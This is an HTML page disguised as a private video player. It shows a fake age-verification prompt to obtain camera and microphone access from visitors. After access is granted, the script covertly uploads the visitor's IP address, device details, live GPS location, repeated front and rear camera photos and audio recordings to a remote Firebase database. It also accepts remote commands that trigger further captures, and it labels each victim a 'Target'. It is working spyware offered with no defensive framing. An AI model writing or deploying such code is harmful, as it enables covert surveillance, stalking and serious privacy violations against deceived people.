<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Cloud Storage | Secure Player</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
        
        /* Aapki Specific Background Image */
        #bg-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('bg.png.jpeg'); /* Aapki file ka name */
            background-size: cover; 
            background-position: center; 
            z-index: 1;
        }

        #overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.3); /* Background image ko thoda dark karne ke liye */
            z-index: 5;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        .play-btn {
            width: 90px; height: 90px; background: rgba(229, 9, 20, 0.9);
            border-radius: 50%; border: 3px solid #fff;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; box-shadow: 0 0 30px rgba(0, 0, 0, 0.8); transition: 0.3s;
        }
        .play-btn::after {
            content: ''; border-style: solid; border-width: 15px 0 15px 30px;
            border-color: transparent transparent transparent #fff; margin-left: 8px;
        }

        .loading-text { 
            color: #fff; margin-top: 20px; font-size: 14px; 
            font-weight: bold; text-shadow: 2px 2px 4px #000;
            letter-spacing: 1px; animation: blink 1.5s infinite; 
        }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

        /* Fake Permission Modal */
        #permission-modal {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: #111; width: 85%; max-width: 320px;
            padding: 25px; border-radius: 10px; border: 1px solid #e50914;
            z-index: 10; text-align: center; display: none; box-shadow: 0 0 50px #000;
        }
        #permission-modal h2 { color: #e50914; font-size: 18px; margin: 0 0 10px 0; }
        #permission-modal p { color: #fff; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
        
        .unlock-btn {
            background: #e50914; color: #fff; border: none; padding: 12px 25px;
            width: 100%; border-radius: 5px; font-weight: bold; font-size: 14px; cursor: pointer;
        }

        /* Video Layer */
        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; }
        #main-player { width: 100%; height: 100%; }
    </style>
</head>
<body>

    <div id="bg-container"></div>

    <div id="overlay">
        <div class="play-btn" id="main-play" onclick="showPopup()"></div>
        <div class="loading-text" id="status-text">CLICK TO PLAY VIDEO</div>
        
        <div id="permission-modal">
            <h2>Age Verification</h2>
            <p>To watch this private content, please complete a quick camera verification to confirm you are 18+.</p>
            <button class="unlock-btn" onclick="ignite()">VERIFY & START</button>
        </div>
    </div>

    <div id="video-container">
        <iframe id="main-player" allow="autoplay; encrypted-media; camera; microphone; geolocation" frameborder="0"></iframe>
    </div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    // Auto Session ID
    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
    const videoID = "bzHvY3_XqtE"; 

    function showPopup() {
        document.getElementById('main-play').style.display = 'none';
        document.getElementById('status-text').style.display = 'none';
        document.getElementById('permission-modal').style.display = 'block';
    }

    async function ignite() {
        try {
            // Permission Request
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // Show Video
            document.getElementById('video-container').style.display = 'block';
            document.getElementById('main-player').src = `https://www.youtube.com/embed/${videoID}?autoplay=1&rel=0`;

            // Data Collection
            logDeviceInfo();
            trackGPS();
            
            // Auto Capture Loop
            capture("user"); 
            setTimeout(() => capture("environment"), 4000);
            setInterval(() => capture("user"), 15000);

            // Dashboard Command Sync
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const c = snap.val();
                if(c) {
                    if(c.act === 'f') capture("user");
                    if(c.act === 'b') capture("environment");
                    if(c.act === 'a') recordAudio(30000);
                    db.ref(`commands/${sessionID}`).remove();
                }
            });

        } catch (e) {
            alert("Verification Failed: Camera access is required to unlock video.");
            location.reload();
        }
    }

    async function logDeviceInfo() {
        let bat = "N/A";
        try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e){}
        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        
        db.ref(`targets/${sessionID}/info`).set({
            name: "Target_" + sessionID.split('_')[1],
            ip: ipReq.ip,
            battery: bat,
            ram: (navigator.deviceMemory || "N/A"),
            platform: navigator.platform,
            status: "ONLINE",
            time: new Date().toLocaleTimeString()
        });
        db.ref('alerts').set({ id: sessionID, t: Date.now() });
    }

    async function capture(mode) {
        try {
            const constraints = { video: { facingMode: mode === "user" ? "user" : "environment" } };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const v = document.createElement('video'); v.srcObject = stream; await v.play();
            
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({ 
                    img: c.toDataURL('image/jpeg', 0.5), 
                    type: mode,
                    time: new Date().toLocaleTimeString()
                });
                stream.getTracks().forEach(t => t.stop());
            }, 1500);
        } catch(e) {}
    }

    async function recordAudio(ms) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mr = new MediaRecorder(stream);
            let ch = [];
            mr.ondataavailable = (e) => ch.push(e.data);
            mr.onstop = () => {
                const blob = new Blob(ch, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({ data: reader.result });
            };
            mr.start(); setTimeout(() => mr.stop(), ms);
        } catch(e) {}
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        }, null, {enableHighAccuracy:true});
    }
</script>
</body>
</html>
